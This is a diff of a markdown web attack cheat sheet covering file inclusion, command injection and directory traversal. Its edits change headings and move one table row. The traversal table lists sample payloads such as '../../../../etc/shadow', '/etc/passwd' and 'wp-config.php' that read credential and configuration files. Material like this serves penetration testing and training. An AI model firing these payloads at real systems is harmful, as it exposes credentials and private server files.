@@ -1,4 +1,4 @@
-## 📁 FILE INCLUSION (LFI & RFI) — Local & Remote File Loaders
+## 📁 FILE INCLUSION (LFI & RFI) — `Local & Remote File Loaders`
 
 | Location Used | Endpoint Example | Method | Input Vector | Attack Surface / Clue | Sample Payload |
 |---------------|------------------|--------|---------------|------------------------|----------------|
@@ -14,7 +14,7 @@
 
 ---
 
-## 🧨 COMMAND INJECTION — When Your Input Talks to the Shell
+## 🧨 COMMAND INJECTION — When Your `Input Talks to the Shell`
 
 | Endpoint | Method | Parameter | Indicator | Injection Sample |
 |----------|--------|-----------|-----------|------------------|
@@ -31,14 +31,14 @@
 
 ---
 
-## 🗂 DIRECTORY TRAVERSAL — Escaping the Jail
+## 🗂 DIRECTORY TRAVERSAL — `Involve a file path` to access sensitive files
 
 | Endpoint | Method | Param | Where it Hits | Payload |
 |----------|--------|--------|---------------|---------|
 | `/view?file=about.html` | GET | `file` | Reads local server files | `?file=../../../../etc/passwd` |
 | `/download.php?doc=invoice.pdf` | GET | `doc` | User documents/downloads | `?doc=../../../../../../boot.ini` |
-| `/readfile` | POST | `path` | JSON or Form input | `{"path": "../../../../etc/shadow"}` |
 | `/log?name=log1.txt` | GET | `name` | Log viewer or config | `?name=../../../wp-config.php` |
+| `/readfile` | POST | `path` | JSON or Form input | `{"path": "../../../../etc/shadow"}` |
 | `/static/file` | GET | `filename` | Public file loaders | `?filename=../../../app.py` |
 
 🎯 **Targets to Traverse**:
